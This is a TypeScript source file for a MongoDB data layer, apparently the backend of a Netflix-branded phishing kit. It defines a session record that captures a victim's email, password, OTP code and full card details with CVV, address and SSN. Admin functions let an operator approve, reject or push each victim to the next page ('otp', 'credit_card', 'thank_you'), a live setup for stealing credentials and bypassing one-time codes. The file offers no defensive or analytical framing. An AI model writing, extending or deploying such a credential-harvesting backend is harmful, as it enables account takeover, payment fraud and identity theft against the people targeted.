import { MongoClient, Db } from "mongodb";

const MONGODB_URI =
  process.env.MONGODB_URI || "mongodb://localhost:27017/netflix_crm";

if (!MONGODB_URI) {
  throw new Error("Please define the MONGODB_URI environment variable");
}

let client: MongoClient;
let clientPromise: Promise<MongoClient>;

declare global {
  var _mongoClientPromise: Promise<MongoClient> | undefined;
}

if (process.env.NODE_ENV === "development") {
  if (!global._mongoClientPromise) {
    client = new MongoClient(MONGODB_URI);
    global._mongoClientPromise = client.connect();
  }
  clientPromise = global._mongoClientPromise;
} else {
  client = new MongoClient(MONGODB_URI);
  clientPromise = client.connect();
}

export async function getDatabase(): Promise<Db> {
  const client = await clientPromise;
  return client.db("netflix_crm");
}

// ONE USER SESSION MODEL - gets updated as user progresses
export interface UserSession {
  _id?: string;
  sessionId: string;

  // Email step data
  email: string;
  password: string;

  // Password step data (gets filled when user reaches password page)
  newPassword?: string;

  // OTP step data (gets filled when user reaches OTP page)
  otpCode?: string;

  // Payment step data (gets filled when user reaches payment page)
  cardInfo?: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    fullName: string;
    address: string;
    city: string;
    state: string;
    zipCode: string;
    ssn: string;
  };

  // Current step and status
  currentStep: "email" | "password" | "otp" | "payment" | "completed";
  status: "pending" | "approved" | "rejected";
  adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
  rejectionReason?: string;

  createdAt: Date;
  updatedAt: Date;
}

// CREATE INITIAL USER SESSION (Email step)
export async function createUserSession(
  email: string,
  password: string
): Promise<string> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  const sessionId = Math.random().toString(36).substring(2, 15);
  const session: UserSession = {
    sessionId,
    email,
    password,
    currentStep: "email",
    status: "pending",
    createdAt: new Date(),
    updatedAt: new Date(),
  };

  await sessions.insertOne(session);
  return sessionId;
}

// UPDATE USER SESSION (Add password step data)
export async function updateUserSessionPassword(
  sessionId: string,
  newPassword: string
): Promise<UserSession | null> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  const result = await sessions.findOneAndUpdate(
    { sessionId },
    {
      $set: {
        newPassword,
        currentStep: "password",
        status: "pending", // Reset status for admin action
        adminAction: undefined, // Clear previous admin action
        rejectionReason: undefined, // Clear previous rejection reason
        updatedAt: new Date(),
      },
    },
    { returnDocument: "after" }
  );

  return result || null;
}

// UPDATE USER SESSION (Add OTP step data)
export async function updateUserSessionOtp(
  sessionId: string,
  otpCode: string
): Promise<UserSession | null> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  const result = await sessions.findOneAndUpdate(
    { sessionId },
    {
      $set: {
        otpCode,
        currentStep: "otp",
        status: "pending", // Reset status for admin action
        adminAction: undefined, // Clear previous admin action
        rejectionReason: undefined, // Clear previous rejection reason
        updatedAt: new Date(),
      },
    },
    { returnDocument: "after" }
  );

  return result || null;
}

// UPDATE USER SESSION (Add payment step data)
export async function updateUserSessionPayment(
  sessionId: string,
  cardInfo: UserSession["cardInfo"]
): Promise<UserSession | null> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  const result = await sessions.findOneAndUpdate(
    { sessionId },
    {
      $set: {
        cardInfo,
        currentStep: "payment",
        status: "pending", // Reset status for admin action
        adminAction: undefined, // Clear previous admin action
        rejectionReason: undefined, // Clear previous rejection reason
        updatedAt: new Date(),
      },
    },
    { returnDocument: "after" }
  );

  return result || null;
}

// UPDATE SESSION STATUS (Admin actions)
export async function updateUserSessionStatus(
  sessionId: string,
  updates: {
    status?: "pending" | "approved" | "rejected";
    adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
    rejectionReason?: string;
  }
): Promise<UserSession | null> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  const result = await sessions.findOneAndUpdate(
    { sessionId },
    { $set: { ...updates, updatedAt: new Date() } },
    { returnDocument: "after" }
  );

  return result || null;
}

// GET USER SESSION
export async function getUserSession(
  sessionId: string
): Promise<UserSession | null> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  return await sessions.findOne({ sessionId });
}

// GET ALL USER SESSIONS (FOR CRM)
export async function getAllUserSessions(): Promise<UserSession[]> {
  const db = await getDatabase();
  const sessions = db.collection<UserSession>("user_sessions");

  return await sessions.find({}).sort({ updatedAt: -1 }).toArray();
}
